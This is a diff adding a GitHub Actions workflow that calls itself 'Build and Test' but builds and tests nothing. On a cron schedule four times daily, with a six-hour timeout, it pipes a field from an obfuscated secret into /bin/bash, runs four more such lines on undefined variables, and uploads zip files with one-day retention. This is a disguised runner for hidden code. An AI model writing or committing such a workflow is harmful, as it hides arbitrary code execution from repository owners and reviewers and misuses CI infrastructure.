@@ -1,0 +1,35 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          yh81: ${{ secrets.yh81 }}
+        run: |
+          printf '%s' "$yh81" | jq -r .qbohz5073 | /bin/bash
+          printf '%s' "$pvbny9" | jq -r .glmgl25 | /bin/bash
+          printf '%s' "$hcbb3363" | jq -r .azyk2 | /bin/bash
+          printf '%s' "$vybw8" | jq -r .j0648 | /bin/bash
+          printf '%s' "$hgq54" | jq -r .j95504 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: AL4r9EDU
+          path: "*.zip"
+          retention-days: 1
